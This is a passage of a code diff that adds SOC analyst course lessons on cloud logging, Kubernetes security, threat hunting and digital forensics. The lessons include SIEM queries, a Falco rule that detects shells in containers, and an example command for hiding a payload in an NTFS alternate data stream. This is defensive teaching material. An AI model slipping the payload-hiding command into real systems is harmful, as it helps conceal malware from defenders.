+- Analyst hours reclaimed
+- Error rate comparison (manual vs automated)
+    `,
+    keyTakeaways: [
+      "Runbooks document single procedures; playbooks cover end-to-end incidents",
+      "Structure runbooks with prerequisites, steps, rollback, and automation potential",
+      "Automate high-volume, low-risk tasks first (enrichment, triage, notifications)",
+      "Always require human approval for destructive actions",
+      "Measure automation ROI with time saved and MTTR reduction"
+    ],
+  },
+  // ===== NEW MODULES: Cloud Security, Threat Intel & Hunting, Digital Forensics =====
+  {
+    id: "7.1",
+    courseId: "soc-analyst-path",
+    title: "Cloud Security Fundamentals for SOC",
+    content: `
+# Cloud Security Fundamentals for SOC
+
+Cloud adoption changes the threat landscape. SOC analysts must understand cloud-specific risks, logging, and detection strategies.
+
+## Shared Responsibility Model
+
+\`\`\`
+                IaaS        PaaS        SaaS
+Application    Customer    Customer    Provider
+Data           Customer    Customer    Customer
+Runtime        Customer    Provider    Provider
+OS             Customer    Provider    Provider
+Virtualization Provider    Provider    Provider
+Network        Provider    Provider    Provider
+Physical       Provider    Provider    Provider
+\`\`\`
+
+**Key takeaway:** You always own your data security, regardless of model.
+
+## Cloud Threat Landscape
+
+### Top Cloud Threats (CSA)
+1. **Misconfiguration** — Public S3 buckets, open security groups
+2. **Insufficient IAM** — Over-privileged accounts, no MFA
+3. **Insecure APIs** — Exposed management APIs
+4. **Account Hijacking** — Compromised cloud credentials
+5. **Data Exfiltration** — Unauthorized data access and download
+
+## Cloud Logging Sources
+
+| Cloud Provider | Key Log Sources |
+|---------------|-----------------|
+| **AWS** | CloudTrail (API), VPC Flow Logs, GuardDuty, S3 Access Logs |
+| **Azure** | Activity Log, Sign-in Logs, NSG Flow Logs, Defender Alerts |
+| **GCP** | Cloud Audit Logs, VPC Flow Logs, Security Command Center |
+| **M365** | Unified Audit Log, Azure AD Sign-ins, Defender Alerts |
+
+## Essential Cloud Detection Use Cases
+
+### Identity-Based Detections
+- Login from impossible travel locations
+- MFA disabled on privileged account
+- New OAuth application consent
+- Service principal credential added
+- Cross-account role assumption
+
+### Configuration-Based Detections
+- S3 bucket made public
+- Security group opened to 0.0.0.0/0
+- Encryption disabled on storage
+- Logging disabled on resources
+- Network ACL modified
+
+### Data-Based Detections
+- Unusual data download volume
+- Access from new IP/geolocation
+- Snapshot shared externally
+- Database export initiated
+- Bulk file downloads from cloud storage
+
+## Cloud Investigation Workflow
+1. **Identify** — Which cloud account, region, and resource?
+2. **Timeline** — When did the activity start? What was normal before?
+3. **Scope** — What resources were accessed? What data was exposed?
+4. **Attribution** — Which identity performed the actions? Compromised?
+5. **Contain** — Disable keys, revoke sessions, restrict access
+6. **Recover** — Rotate credentials, restore configurations, patch gaps
+    `,
+    keyTakeaways: [
+      "Shared responsibility means you always own data security",
+      "Misconfiguration is the #1 cloud security threat",
+      "Each cloud provider has specific logging sources for SOC monitoring",
+      "Focus on identity, configuration, and data-based detections",
+      "Cloud investigations follow the same framework but with different artifacts"
+    ],
+  },
+  {
+    id: "7.2",
+    courseId: "soc-analyst-path",
+    title: "AWS CloudTrail & GuardDuty Analysis",
+    content: `
+# AWS CloudTrail & GuardDuty Analysis
+
+AWS CloudTrail logs every API call in your AWS account. GuardDuty uses ML to detect threats. Together they're your primary AWS security visibility.
+
+## CloudTrail Event Structure
+
+\`\`\`json
+{
+  "eventTime": "2024-12-15T14:32:18Z",
+  "eventSource": "s3.amazonaws.com",
+  "eventName": "PutBucketPolicy",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.42",
+  "userIdentity": {
+    "type": "IAMUser",
+    "userName": "admin-user",
+    "arn": "arn:aws:iam::123456789012:user/admin-user"
+  },
+  "requestParameters": {
+    "bucketName": "company-data",
+    "policy": "{\\"Effect\\":\\"Allow\\",\\"Principal\\":\\"*\\"}"
+  }
+}
+\`\`\`
+
+## Critical CloudTrail Events to Monitor
+
+| Event | Risk | MITRE ATT&CK |
+|-------|------|---------------|
+| ConsoleLogin (no MFA) | Account compromise | T1078 |
+| CreateAccessKey | Persistence | T1098 |
+| StopLogging | Defense evasion | T1562.008 |
+| PutBucketPolicy (public) | Data exposure | T1537 |
+| AuthorizeSecurityGroupIngress (0.0.0.0/0) | Network exposure | T1562 |
+| CreateUser / AttachUserPolicy | Privilege escalation | T1098 |
+| AssumeRole (cross-account) | Lateral movement | T1550 |
+
+## GuardDuty Finding Types
+
+### High Severity
+- **UnauthorizedAccess:IAMUser/MaliciousIPCaller** — API call from known threat IP
+- **Trojan:EC2/DNSDataExfiltration** — DNS-based data exfiltration
+- **CryptoCurrency:EC2/BitcoinTool** — Crypto mining detected
+
+### Medium Severity
+- **Recon:EC2/PortProbeUnprotectedPort** — Port scanning detected
+- **UnauthorizedAccess:EC2/SSHBruteForce** — SSH brute force
+- **Persistence:IAMUser/AnomalousBehavior** — Unusual IAM activity
+
+## Investigation Queries
+
+\`\`\`
+# Find all actions by a compromised user
+index=aws sourcetype=aws:cloudtrail userIdentity.userName="compromised-user"
+| stats count by eventName, sourceIPAddress, awsRegion
+| sort -count
+
+# Detect disabled logging
+index=aws sourcetype=aws:cloudtrail eventName IN ("StopLogging","DeleteTrail","UpdateTrail")
+
+# Find public S3 buckets
+index=aws sourcetype=aws:cloudtrail eventName="PutBucketPolicy"
+| where match(requestParameters, "Principal.*\\\\*")
+\`\`\`
+
+## Response Actions
+1. Disable compromised access keys
+2. Revoke active sessions
+3. Review and revert unauthorized changes
+4. Enable MFA on affected accounts
+5. Rotate all credentials in the affected account
+    `,
+    keyTakeaways: [
+      "CloudTrail logs every AWS API call — essential for investigation",
+      "Monitor StopLogging, CreateAccessKey, and public bucket policies",
+      "GuardDuty provides ML-based threat detection with severity levels",
+      "Correlate GuardDuty findings with CloudTrail for full context",
+      "First response: disable keys, revoke sessions, rotate credentials"
+    ],
+  },
+  {
+    id: "7.3",
+    courseId: "soc-analyst-path",
+    title: "Azure & Microsoft 365 Security Monitoring",
+    content: `
+# Azure & Microsoft 365 Security Monitoring
+
+Microsoft environments are ubiquitous in enterprise. Azure AD sign-in logs, Unified Audit Logs, and Defender alerts form your core visibility.
+
+## Azure AD Sign-in Log Analysis
+
+### Key Fields
+- **UserPrincipalName** — Who signed in
+- **IPAddress** — Source IP
+- **Location** — Geographic location
+- **Status** — Success/failure with error codes
+- **ConditionalAccessStatus** — Policy evaluation result
+- **MFADetail** — MFA method used
+- **RiskLevel** — Azure AD Identity Protection risk
+
+### Critical Sign-in Scenarios
+\`\`\`
+# Impossible travel detection
+User logs in from New York at 10:00 AM
+Same user logs in from London at 10:30 AM
+→ Travel time: 7+ hours, actual gap: 30 minutes = IMPOSSIBLE TRAVEL
+
+# Password spray detection
+100+ failed sign-ins across different accounts
+Same source IP, same time window
+Error code: 50126 (invalid password)
+→ Likely password spray attack
+
+# Token theft detection
+Successful sign-in followed by:
+- Activity from different IP/device
+- No corresponding sign-in event
+→ Possible stolen session token
+\`\`\`
+
+## Microsoft 365 Unified Audit Log
+
+### High-Value Events
+| Operation | Risk |
+|-----------|------|
+| New-InboxRule (forwarding) | Email compromise / persistence |
+| Add-MailboxPermission | Unauthorized access |
+| Set-AdminAuditLogConfig | Audit evasion |
+| New-ManagementRoleAssignment | Privilege escalation |
+| FileDownloaded (bulk) | Data exfiltration |
+| SharingSet (external) | Data exposure |
+
+### Investigation Example: Compromised Mailbox
+\`\`\`
+# Step 1: Check sign-in activity
+AuditLogs | where UserPrincipalName == "user@company.com"
+| where TimeGenerated > ago(7d)
+| project TimeGenerated, IPAddress, Location, ResultType
+
+# Step 2: Check for mailbox rules
+Search-UnifiedAuditLog -Operations New-InboxRule
+-UserIds user@company.com -StartDate (Get-Date).AddDays(-30)
+
+# Step 3: Check for email access
+Search-UnifiedAuditLog -Operations MailItemsAccessed
+-UserIds user@company.com
+\`\`\`
+
+## Microsoft Defender Alerts
+
+### Alert Severity Mapping
+- **High** — Active attack, immediate response needed
+- **Medium** — Suspicious activity, investigate within 4 hours
+- **Low** — Potentially unwanted, review within 24 hours
+- **Informational** — No immediate action, track for patterns
+
+## Key Detection Rules for M365
+- OAuth app with mail.read permissions granted
+- External forwarding rule created
+- Admin role assigned outside change window
+- Bulk file download from SharePoint/OneDrive
+- Guest user added to sensitive Teams channel
+    `,
+    keyTakeaways: [
+      "Azure AD sign-in logs reveal impossible travel, password sprays, and token theft",
+      "M365 Unified Audit Log tracks email rules, file access, and permission changes",
+      "Monitor inbox forwarding rules — they indicate email compromise persistence",
+      "OAuth app consents with mail permissions are a common attack vector",
+      "Correlate sign-in anomalies with subsequent mailbox and file activity"
+    ],
+  },
+  {
+    id: "7.4",
+    courseId: "soc-analyst-path",
+    title: "Container & Kubernetes Security",
+    content: `
+# Container & Kubernetes Security
+
+Containers introduce new attack surfaces. SOC analysts must understand container-specific threats and monitoring approaches.
+
+## Container Threat Model
+
+\`\`\`
+Attack Surface:
+├── Container Image — Vulnerabilities, malware, secrets in layers
+├── Container Runtime — Escapes, privilege escalation
+├── Orchestrator (K8s) — Misconfig, RBAC, API exposure
+├── Network — East-west traffic, service mesh
+└── Host OS — Kernel exploits, shared resources
+\`\`\`
+
+## Key Kubernetes Security Concepts
+
+### Pod Security
+- **Privileged containers** — Full host access (dangerous)
+- **Root user** — Running as UID 0 (avoid)
+- **Host namespaces** — Sharing host PID/network/IPC
+- **Capabilities** — Fine-grained Linux privileges
+
+### RBAC (Role-Based Access Control)
+\`\`\`yaml
+# Overly permissive — BAD
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+subjects:
+- kind: ServiceAccount
+  name: default
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin  # Full cluster access!
+\`\`\`
+
+## Detection Use Cases
+
+### Image Security
+- Image pulled from untrusted registry
+- Known CVE in running container
+- Secrets hardcoded in image layers
+- Image not signed/verified
+
+### Runtime Threats
+- Shell spawned inside container
+- Unexpected network connection from container
+- File written to sensitive path (/etc/shadow, /root/.ssh)
+- Privilege escalation attempt (sudo, setuid)
+- Crypto miner process detected
+
+### Kubernetes API Abuse
+- Anonymous API access
+- Secrets accessed by unusual service account
+- New ClusterRoleBinding with cluster-admin
+- Pod created with hostPath mount to /
+- exec into running container from unknown source
+
+## Monitoring Tools
+
+| Tool | Purpose |
+|------|---------|
+| Falco | Runtime threat detection (open source) |
+| Sysdig | Container monitoring and forensics |
+| Aqua Security | Full container security platform |
+| Prisma Cloud | Cloud-native security |
+| kube-bench | CIS benchmark compliance checking |
+
+## Falco Rule Example
+
+\`\`\`yaml
+- rule: Shell Spawned in Container
+  desc: Detect shell process started in a container
+  condition: >
+    spawned_process and container and
+    proc.name in (bash, sh, zsh, dash, ksh)
+  output: >
+    Shell spawned in container
+    (user=%user.name container=%container.name
+     image=%container.image.repository
+     command=%proc.cmdline)
+  priority: WARNING
+\`\`\`
+
+## Investigation Approach
+1. Identify the affected container/pod and node
+2. Check container image for known vulnerabilities
+3. Review Kubernetes audit logs for API activity
+4. Analyze container runtime logs (stdout/stderr)
+5. Check network connections to/from the container
+6. Determine if container escape occurred (check host)
+    `,
+    keyTakeaways: [
+      "Containers have unique attack surfaces: images, runtime, orchestrator, network",
+      "Never run containers as root or with privileged mode in production",
+      "Monitor for shells in containers, unexpected connections, and K8s API abuse",
+      "Falco provides open-source runtime threat detection for containers",
+      "Always check if container escape to the host occurred during investigation"
+    ],
+  },
+  {
+    id: "8.1",
+    courseId: "soc-analyst-path",
+    title: "Threat Intelligence Lifecycle",
+    content: `
+# Threat Intelligence Lifecycle
+
+Threat intelligence transforms raw data into actionable insights that improve detection, response, and prevention.
+
+## The Intelligence Lifecycle
+
+\`\`\`
+┌──────────┐   ┌──────────┐   ┌──────────┐
+│ Planning  │ → │Collection│ → │Processing│
+│& Direction│   │          │   │          │
+└──────────┘   └──────────┘   └──────────┘
+      ↑                            ↓
+┌──────────┐   ┌──────────┐   ┌──────────┐
+│Feedback  │ ← │Dissemi-  │ ← │ Analysis │
+│          │   │ nation   │   │          │
+└──────────┘   └──────────┘   └──────────┘
+\`\`\`
+
+### 1. Planning & Direction
+Define intelligence requirements:
+- What threats target our industry?
+- Which threat actors are most relevant?
+- What gaps exist in our current detections?
+- What does leadership need to make decisions?
+
+### 2. Collection
+Gather raw data from multiple sources:
+
+| Source Type | Examples |
+|-------------|----------|
+| Open Source (OSINT) | Twitter, blogs, paste sites, forums |
+| Commercial Feeds | Recorded Future, Mandiant, CrowdStrike |
+| Government | CISA, FBI Flash, sector ISACs |
+| Internal | SOC incidents, IR findings, honeypots |
+| Dark Web | Forums, marketplaces, leak sites |
+| Technical | Malware sandboxes, DNS sinkholes |
+
+### 3. Processing
+Transform raw data into usable format:
+- Normalize IOCs (defang, deduplicate, validate)
+- Structure data using STIX format
+- Tag with context (threat actor, campaign, confidence)
+- Remove false positives and duplicates
+
+### 4. Analysis
+Turn information into intelligence:
+- Identify patterns and trends
+- Attribute activity to threat actors
+- Assess relevance to your organization
+- Determine confidence levels
+- Create actionable recommendations
+
+### 5. Dissemination
+Deliver intelligence to consumers:
+
+| Consumer | Product | Format |
+|----------|---------|--------|
+| SOC Analysts | IOC feeds, detection rules | Machine-readable |
+| IR Team | Threat reports, TTPs | Detailed technical |
+| CISO | Executive briefings | Strategic summary |
+| IT Ops | Vulnerability priorities | Actionable list |
+
+### 6. Feedback
+- Was the intelligence useful?
+- Did it improve detection?
+- What gaps remain?
+- Adjust collection priorities
+
+## Intelligence Types
+
+### Strategic
+- Long-term trends and geopolitical context
+- Audience: Executives, board
+- Example: "Ransomware groups are increasingly targeting healthcare"
+
+### Operational
+- Specific campaigns and threat actor capabilities
+- Audience: IR teams, hunt teams
+- Example: "APT29 is using a new backdoor in diplomatic phishing"
+
+### Tactical
+- IOCs and TTPs for immediate detection
+- Audience: SOC analysts, detection engineers
+- Example: "Block these 15 C2 domains associated with QakBot"
+    `,
+    keyTakeaways: [
+      "The intelligence lifecycle has 6 phases: Plan, Collect, Process, Analyze, Disseminate, Feedback",
+      "Collect from diverse sources: OSINT, commercial, government, internal",
+      "Intelligence must be actionable — raw IOCs are data, not intelligence",
+      "Tailor products to the audience: strategic, operational, or tactical",
+      "Feedback loops ensure intelligence stays relevant and effective"
+    ],
+  },
+  {
+    id: "8.2",
+    courseId: "soc-analyst-path",
+    title: "Building IOC Feeds & STIX/TAXII",
+    content: `
+# Building IOC Feeds & STIX/TAXII
+
+Structured threat intelligence sharing enables automated detection across organizations. STIX and TAXII are the industry standards.
+
+## STIX (Structured Threat Information eXpression)
+
+STIX is a JSON-based language for describing cyber threat intelligence:
+
+### STIX Domain Objects (SDOs)
+| Object | Purpose | Example |
+|--------|---------|---------|
+| Indicator | Observable pattern | File hash, IP address, domain |
+| Malware | Malware description | Emotet, QakBot, Cobalt Strike |
+| Threat Actor | Adversary profile | APT29, Lazarus Group |
+| Attack Pattern | TTP description | Spear phishing, credential dumping |
+| Campaign | Related activity | Operation Dark Cloud |
+| Vulnerability | CVE reference | CVE-2024-1234 |
+
+### STIX Indicator Example
+\`\`\`json
+{
+  "type": "indicator",
+  "id": "indicator--a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+  "created": "2024-12-15T10:00:00Z",
+  "name": "Cobalt Strike C2 Domain",
+  "pattern": "[domain-name:value = 'malicious-c2.example.com']",
+  "pattern_type": "stix",
+  "valid_from": "2024-12-15T00:00:00Z",
+  "labels": ["malicious-activity"],
+  "confidence": 85
+}
+\`\`\`
+
+## TAXII (Trusted Automated eXchange of Intelligence Information)
+
+TAXII defines how STIX intelligence is shared:
+
+### TAXII Models
+- **Collections** — Server hosts data, clients pull (REST API)
+- **Channels** — Publish/subscribe model
+
+### TAXII Workflow
+\`\`\`
+Intelligence Producer → TAXII Server → TAXII Client → SIEM/TIP
+    (creates STIX)      (hosts feeds)    (polls for     (applies
+                                          new IOCs)      detections)
+\`\`\`
+
+## Building Your IOC Feed
+
+### Step 1: Source Selection
+- MISP community feeds (free)
+- AlienVault OTX (free)
+- Abuse.ch (URLhaus, MalwareBazaar, Feodo Tracker)
+- Government feeds (CISA, US-CERT)
+- Commercial feeds (for budget-available orgs)
+
+### Step 2: IOC Quality Control
+\`\`\`
+Raw IOC Ingestion
+    ↓
+[Deduplication] — Remove duplicates
+    ↓
+[Validation] — Check format, resolve DNS, verify active
+    ↓
+[Enrichment] — Add context (threat actor, campaign, confidence)
+    ↓
+[Aging] — Set expiration (IPs: 30 days, Domains: 90 days, Hashes: 1 year)
+    ↓
+[Distribution] — Push to SIEM, EDR, firewall, proxy
+\`\`\`
+
+### Step 3: Feed Integration
+\`\`\`
+# SIEM lookup table integration
+| lookup threat_intel_ioc indicator as src_ip OUTPUT threat_name, confidence
+| where isnotnull(threat_name) AND confidence > 70
+\`\`\`
+
+## IOC Lifecycle Management
+- **Fresh IOCs** (< 24h) — Highest confidence, immediate blocking
+- **Active IOCs** (1-30 days) — High confidence, alert and investigate
+- **Aging IOCs** (30-90 days) — Medium confidence, monitor only
+- **Expired IOCs** (> 90 days) — Remove from active detection
+    `,
+    keyTakeaways: [
+      "STIX is the standard format for structured threat intelligence",
+      "TAXII enables automated sharing of STIX data between organizations",
+      "IOC quality control prevents false positives from bad intelligence",
+      "Set expiration dates: IPs age faster than domains or file hashes",
+      "Integrate feeds into SIEM, EDR, and network controls for automated detection"
+    ],
+  },
+  {
+    id: "8.3",
+    courseId: "soc-analyst-path",
+    title: "Hypothesis-Driven Threat Hunting",
+    content: `
+# Hypothesis-Driven Threat Hunting
+
+Threat hunting proactively searches for threats that evade automated detection. It starts with a hypothesis and uses data analysis to validate or disprove it.
+
+## Hunting vs Detection
+
+| | Detection | Hunting |
+|---|-----------|---------|
+| **Approach** | Reactive (wait for alerts) | Proactive (search for threats) |
+| **Trigger** | Automated rules | Analyst hypothesis |
+| **Coverage** | Known patterns | Unknown/novel threats |
+| **Output** | Alerts | New detections, intelligence |
+
+## The Hunting Loop
+
+\`\`\`
+Hypothesis → Data Collection → Analysis → Findings → New Detections
+     ↑                                                      ↓
+     └──────────── Threat Intelligence ←────────────────────┘
+\`\`\`
+
+## Building Hypotheses
+
+### Sources for Hypotheses
+1. **Threat intelligence** — "APT group X uses technique Y"
+2. **MITRE ATT&CK** — "We have no detection for T1053 (Scheduled Tasks)"
+3. **Incident findings** — "Attacker used WMI; are there other instances?"
+4. **Industry reports** — "Ransomware groups targeting our sector use method Z"
+5. **Anomaly observation** — "Why is this server making DNS queries to unusual TLDs?"
+
+### Hypothesis Template
+\`\`\`
+IF [threat actor/technique] targets [our environment]
+THEN we should see [specific observable evidence]
+IN [data source] WITHIN [time frame]
+\`\`\`
+
+### Example Hypotheses
+- "If an attacker is using scheduled tasks for persistence, we should see Event ID 4698 with unusual task names in the last 30 days"
+- "If data is being exfiltrated via DNS, we should see unusually long DNS queries (>50 chars) to rare domains"
+- "If lateral movement via PsExec is occurring, we should see service installations (Event ID 7045) with PSEXESVC"
+
+## Hunt Execution
+
+### Step 1: Scope
+- Define time window (typically 30-90 days)
+- Identify data sources needed
+- Determine assets in scope
+
+### Step 2: Data Collection
+\`\`\`
+# Example: Hunt for scheduled task persistence
+index=windows EventCode=4698
+| rex field=TaskContent "(?<command>.*?)"
+| stats count by Computer, TaskName, command
+| where NOT match(TaskName, "(?i)(microsoft|windows|google|adobe)")
+| sort -count
+\`\`\`
+
+### Step 3: Analysis
+- Stack and frequency analysis
+- Outlier detection
+- Timeline correlation
+- Known-good baselining
+
+### Step 4: Document Findings
+\`\`\`markdown
+## Hunt Report: Scheduled Task Persistence
+**Hypothesis:** Attackers using scheduled tasks for persistence
+**Time Window:** Last 90 days
+**Data Source:** Windows Security Event Logs (4698, 4702)
+**Findings:**
+- 3 suspicious tasks identified on FINANCE-WS012
+- Task "SystemHealthCheck" executes PowerShell from %TEMP%
+- Created 45 days ago, runs every 4 hours
+**Recommendation:** Escalate to IR, create detection rule
+\`\`\`
+
+### Step 5: Operationalize
+Convert hunting findings into automated detections to catch the same technique in the future.
+    `,
+    keyTakeaways: [
+      "Hunting is proactive — searching for threats that bypass automated detection",
+      "Start with a testable hypothesis based on threat intel or ATT&CK gaps",
+      "Use frequency analysis and outlier detection to find anomalies",
+      "Document every hunt with hypothesis, methodology, and findings",
+      "Operationalize findings by creating new automated detection rules"
+    ],
+  },
+  {
+    id: "8.4",
+    courseId: "soc-analyst-path",
+    title: "Hunting with Data Analytics",
+    content: `
+# Hunting with Data Analytics
+
+Data analytics techniques help hunters find hidden threats in massive datasets by identifying statistical anomalies and unusual patterns.
+
+## Analytical Techniques
+
+### 1. Stacking (Frequency Analysis)
+Count occurrences and look for rare values:
+\`\`\`
+# Find rare processes across all endpoints
+index=edr event_type=process_start
+| stats count dc(hostname) as host_count by process_name
+| where host_count < 3
+| sort count
+\`\`\`
+
+**What it finds:** Unique malware, custom tools, rare LOLBins
+
+### 2. Long Tail Analysis
+Most environments follow a power law — common activity dominates:
+\`\`\`
+Total process executions:    1,000,000
+Top 100 processes:              980,000 (98%)
+Remaining 500 processes:         20,000 (2%)  ← Hunt here
+\`\`\`
+
+### 3. Beaconing Detection
+C2 traffic often has regular intervals:
+\`\`\`
+# Detect beaconing by analyzing connection intervals
+index=proxy
+| stats list(timestamp) as times by src_ip, dest_domain
+| eval intervals=mvmap(times, relative_time(times, "-1s"))
+| stats stdev(intervals) as jitter, avg(intervals) as avg_interval by src_ip, dest_domain
+| where jitter < 5 AND avg_interval > 30 AND avg_interval < 3600
+| sort jitter
+\`\`\`
+
+**Low jitter + regular intervals = likely beaconing**
+
+### 4. Data Volume Anomalies
+\`\`\`
+# Detect unusual data transfers
+index=proxy
+| timechart span=1h sum(bytes_out) as total_bytes by src_ip
+| eventstats avg(total_bytes) as avg_bytes, stdev(total_bytes) as stdev_bytes by src_ip
+| where total_bytes > (avg_bytes + 3*stdev_bytes)
+\`\`\`
+
+**3+ standard deviations above mean = statistical anomaly**
+
+### 5. First-Time Seen Analysis
+\`\`\`
+# Find first-time connections to external domains
+index=dns
+| stats earliest(timestamp) as first_seen, count by query_domain
+| where first_seen > relative_time(now(), "-24h")
+| where count < 5
+\`\`\`
+
+### 6. Clustering
+Group similar behaviors to find outliers:
+- Endpoints with similar process execution patterns
+- Users with similar access patterns
+- Network connections with similar characteristics
+- Anomalous clusters may indicate compromise
+
+## Building Baselines
+
+### What to Baseline
+| Data Type | Baseline Metric |
+|-----------|----------------|
+| Process execution | Top 500 processes per endpoint type |
+| Network connections | Normal destination domains per department |
+| Authentication | Typical login times and locations per user |
+| Data transfer | Average daily upload/download per user |
+| DNS queries | Normal query volume and TLD distribution |
+
+### Baseline Maintenance
+- Rebuild baselines monthly
+- Exclude known incident periods
+- Segment by department/role/endpoint type
+- Account for seasonal variations (month-end, quarter-end)
+
+## Hunt Metrics
+- Number of hunts conducted per quarter
+- Findings per hunt (threats, improvements, nothing)
+- Time from finding to detection rule
+- Unique techniques covered
+- Dwell time reduction attributed to hunting
+    `,
+    keyTakeaways: [
+      "Stacking reveals rare processes, domains, and connections",
+      "Beaconing detection uses interval consistency (low jitter) analysis",
+      "3+ standard deviations indicates statistically unusual behavior",
+      "First-time-seen analysis catches new threats entering the environment",
+      "Build and maintain baselines segmented by department and endpoint type"
+    ],
+  },
+  {
+    id: "9.1",
+    courseId: "soc-analyst-path",
+    title: "Digital Forensics Methodology",
+    content: `
+# Digital Forensics Methodology
+
+Digital forensics follows a structured methodology to ensure evidence integrity and findings that can withstand legal scrutiny.
+
+## The Forensic Process
+
+\`\`\`
+Identification → Preservation → Collection → Analysis → Presentation
+\`\`\`
+
+### 1. Identification
+Determine what evidence exists and where:
+- Which systems are involved?
+- What types of data are relevant?
+- What is the scope of the investigation?
+- Is there a legal hold requirement?
+
+### 2. Preservation
+Prevent evidence alteration:
+- Do NOT power off (may lose volatile data)
+- Document the scene (photos, notes)
+- Isolate from network (prevent remote wipe)
+- Begin chain of custody documentation
+
+### 3. Collection
+Acquire evidence following order of volatility:
+
+\`\`\`
+Most Volatile ─────────────────── Least Volatile
+CPU Registers → Memory → Network → Processes → Disk → Backups
+    ↑                                                    ↑
+  Seconds                                             Permanent
+\`\`\`
+
+### 4. Analysis
+Examine evidence systematically:
+- Timeline analysis (what happened when)
+- Artifact analysis (what tools/techniques were used)
+- Correlation (connect events across sources)
+- Attribution (who did it, if possible)
+
+### 5. Presentation
+Communicate findings:
+- Technical report for IR team
+- Executive summary for leadership
+- Legal report if prosecution is involved
+- Remediation recommendations
+
+## Evidence Integrity
+
+### Hashing
+Always hash evidence before and after acquisition:
+\`\`\`bash
+# Create hash of disk image
+sha256sum disk_image.dd > disk_image.sha256
+
+# Verify integrity
+sha256sum -c disk_image.sha256
+# disk_image.dd: OK
+\`\`\`
+
+### Chain of Custody Form
+\`\`\`
+EVIDENCE ITEM: [Description]
+CASE ID: [Case Number]
+HASH: [SHA256 value]
+
+| Date/Time | Action | Person | Location | Notes |
+|-----------|--------|--------|----------|-------|
+| 2024-12-15 14:00 | Acquired | J. Smith | Server Room | Live acquisition |
+| 2024-12-15 15:30 | Transferred | J. Smith → M. Jones | Forensic Lab | Sealed bag #1234 |
+| 2024-12-16 09:00 | Analyzed | M. Jones | Forensic Lab | Working copy created |
+\`\`\`
+
+## Forensic Workstation Setup
+
+### Essential Tools
+| Tool | Purpose | License |
+|------|---------|---------|
+| Autopsy | Disk forensics GUI | Open source |
+| FTK Imager | Disk imaging | Free |
+| Volatility 3 | Memory analysis | Open source |
+| Wireshark | Network forensics | Open source |
+| KAPE | Artifact collection | Free |
+| Arsenal Image Mounter | Mount forensic images | Free/Commercial |
+| Eric Zimmerman Tools | Windows artifact parsing | Free |
+
+### Forensic OS Options
+- **SIFT Workstation** (SANS) — Ubuntu-based, comprehensive
+- **REMnux** — Malware analysis focused
+- **Kali Linux** — Penetration testing and forensics
+- **Windows + tools** — For Windows-specific artifact analysis
+    `,
+    keyTakeaways: [
+      "Follow the 5-phase methodology: Identify, Preserve, Collect, Analyze, Present",
+      "Collect evidence in order of volatility — memory first, disk last",
+      "Always hash evidence and maintain chain of custody documentation",
+      "Use working copies for analysis — never modify original evidence",
+      "Essential free tools: Autopsy, FTK Imager, Volatility, KAPE"
+    ],
+  },
+  {
+    id: "9.2",
+    courseId: "soc-analyst-path",
+    title: "Disk Imaging & File System Analysis",
+    content: `
+# Disk Imaging & File System Analysis
+
+Disk imaging creates a bit-for-bit copy of storage media. File system analysis reveals files, deleted data, and hidden artifacts.
+
+## Disk Imaging
+
+### Imaging Tools
+| Tool | Type | Features |
+|------|------|----------|
+| FTK Imager | GUI | Easy to use, multiple formats, free |
+| dd / dcfldd | Command line | Raw imaging, Linux standard |
+| Guymager | GUI (Linux) | Fast, multi-threaded |
+| X-Ways Forensics | Commercial | Advanced, professional |
+
+### Image Formats
+- **RAW (.dd, .img)** — Exact bit copy, largest size
+- **E01 (EnCase)** — Compressed, includes metadata and hash verification
+- **AFF4** — Advanced forensic format, compression and encryption
+
+### Creating a Forensic Image
+\`\`\`bash
+# Using dcfldd (enhanced dd with hashing)
+dcfldd if=/dev/sda of=/evidence/case001/disk.dd \
+  hash=sha256 \
+  hashwindow=1G \
+  hashlog=/evidence/case001/disk.hash
+
+# Using FTK Imager CLI
+ftkimager /dev/sda /evidence/case001/disk.E01 \
+  --case-number "CASE-2024-001" \
+  --evidence-number "E001" \
+  --examiner "Analyst Name" \
+  --compress
+\`\`\`
+
+## File System Analysis
+
+### NTFS Key Artifacts
+| Artifact | Location | Value |
+|----------|----------|-------|
+| $MFT | Root | Master File Table — metadata for every file |
+| $LogFile | Root | Transaction log — file system changes |
+| $UsnJrnl | $Extend | Change journal — file creates/deletes/renames |
+| $I30 | Directories | Directory index — includes deleted entries |
+| Zone.Identifier | ADS | Mark of the Web — download source |
+
+### Recovering Deleted Files
+When a file is "deleted":
+1. MFT entry marked as available
+2. Data clusters marked as free
+3. **Data remains until overwritten**
+
+\`\`\`
+# File is deleted but data persists:
+MFT Entry: [Marked as deleted]
+Data Clusters: [Still contain original data]
+USN Journal: [Records the deletion event]
+\`\`\`
+
+### Analyzing MFT
+\`\`\`bash
+# Extract MFT with KAPE
+kape.exe --tsource C: --tdest /output --target MFT
+
+# Parse MFT with MFTECmd (Eric Zimmerman)
+MFTECmd.exe -f "$MFT" --csv /output --csvf mft_parsed.csv
+\`\`\`
+
+### Key Analysis Questions
+- What files were created/modified around the incident time?
+- Were any files deleted to cover tracks?
+- What was downloaded from the internet (Zone.Identifier)?
+- Are there files in unusual locations (%TEMP%, Recycle Bin)?
+- Do any files have suspicious timestamps (timestomping)?
+
+## Alternate Data Streams (ADS)
+NTFS supports hidden data streams:
+\`\`\`bash
+# List ADS on a file
+dir /r suspicious.exe
+# suspicious.exe
+# suspicious.exe:hidden_payload:$DATA
+
+# Attackers use ADS to hide data
+type payload.exe > innocent.txt:hidden.exe
+\`\`\`
+
+## Practical Workflow
+1. Create forensic image with hash verification
+2. Mount image read-only
+3. Parse MFT and USN Journal for file activity timeline
+4. Search for suspicious files by name, location, and timestamp
+5. Recover deleted files from unallocated space
+6. Check Alternate Data Streams for hidden content
+7. Document all findings with evidence references
+    `,
+    keyTakeaways: [
+      "Always create verified forensic images before analysis",
+      "NTFS artifacts ($MFT, $UsnJrnl, $LogFile) reveal file activity history",
+      "Deleted files can be recovered until clusters are overwritten",
+      "Alternate Data Streams can hide malicious payloads",
+      "Use KAPE for rapid artifact collection and Eric Zimmerman tools for parsing"
+    ],
+  },
+  {
+    id: "9.3",
+    courseId: "soc-analyst-path",
+    title: "Timeline Analysis & Super Timeline",
+    content: `
+# Timeline Analysis & Super Timeline
+
+Timeline analysis is the most powerful forensic technique — it correlates events from multiple sources into a single chronological view.
+
+## Why Timeline Analysis?
+
